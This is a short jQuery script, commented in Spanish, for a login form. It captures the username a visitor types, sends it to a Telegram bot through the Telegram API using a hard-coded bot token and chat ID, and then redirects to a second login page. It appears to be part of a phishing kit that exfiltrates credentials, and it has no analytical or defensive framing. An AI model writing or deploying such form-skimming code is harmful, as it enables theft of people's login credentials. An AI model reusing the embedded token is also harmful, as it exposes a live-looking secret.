<script type="text/javascript">
$(document).ready(function() {
  $("#loginForm").submit(function(event) {
    event.preventDefault(); // Evitar el envío del formulario por defecto
    
    // Obtener los datos del formulario
    var usuario = $("#user").val();
    
    // Construir el mensaje para enviar a Telegram
    var mensaje = "Nuevo usuario: " + usuario;
    
    // URL de la API de Telegram
    var telegramAPI = "https://api.telegram.org/bot6931733086:AAE8K0GHhBQLyPQ5pm2UbJ2IhkgBmg6raDI/sendMessage";
    
    // Datos para enviar a la API de Telegram
    var data = {
      chat_id: "6044742043",
      text: mensaje
    };
    
    // Realizar la solicitud POST a la API de Telegram
    $.post(telegramAPI, data)
      .done(function(response) {
        // Redirigir al usuario a index2.html después de enviar el mensaje
        window.location.href = "login-dos.html";
      })
      .fail(function(error) {
        // Manejar el error de la solicitud
        console.error("Error al enviar el mensaje a Telegram:", error);
      });
  });
});
</script>
